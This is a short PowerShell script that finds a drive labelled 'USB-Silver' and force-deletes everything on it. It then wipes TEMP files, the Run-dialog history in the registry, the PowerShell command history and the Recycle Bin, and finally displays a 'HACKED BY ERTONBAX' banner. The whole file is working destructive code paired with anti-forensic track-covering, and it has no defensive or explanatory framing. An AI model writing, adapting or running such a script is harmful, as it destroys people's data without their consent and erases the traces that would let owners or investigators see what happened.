# 1. Looking for Harddrive called "USB-Silver"
$target = Get-Volume | Where-Object { $_.FileSystemLabel -eq "USB-Silver" }

# 2. Wiping Command
if ($target) {
    $driveLetter = $target.DriveLetter + ":"
    Write-Host "[*] Harddrive $driveLetter detected. Wiping Harddrive..." -ForegroundColor Yellow
    Remove-Item "$driveLetter\*" -Recurse -Force -ErrorAction SilentlyContinue
}

# Removes Command from Win + R Memory
Remove-Item "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /va /f
Remove-Item (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue
Clear-RecycleBin -Force -ErrorAction SilentlyContinue

# Exit Message
Clear-Host
Write-Host "==========================================" -ForegroundColor Red
Write-Host "          HACKED BY ERTONBAX              " -ForegroundColor Yellow -BackgroundColor Black
Write-Host "==========================================" -ForegroundColor Red
Start-Sleep -Seconds 3
Exit
